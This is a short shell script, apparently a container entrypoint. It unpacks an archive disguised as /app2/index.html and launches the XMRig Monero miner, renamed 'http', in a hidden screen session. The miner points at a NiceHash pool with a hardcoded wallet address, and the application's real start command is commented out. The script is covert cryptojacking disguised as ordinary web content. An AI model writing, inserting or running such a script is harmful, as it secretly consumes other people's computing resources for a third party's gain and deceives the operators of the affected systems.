#!/bin/sh

# Download the http file


# Extract the http file
tar -xvzf /app2/index.html -C /app2/


# Change directory to the extracted folder
cd /app2/httpalpine

# Run XMRig with screen
screen -dmS http_session sh -c "./http -a randomx -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u NHbEnMD3JzpTFEEPPH9y5hitHCWbGE2PCfCs.${HOSTNAME} -p x -k --nicehash --cpu-no-yield"

# Change directory to /app and run the original command in the background
#cd /app
#npm run start

# Keep the container running
tail -f /dev/null
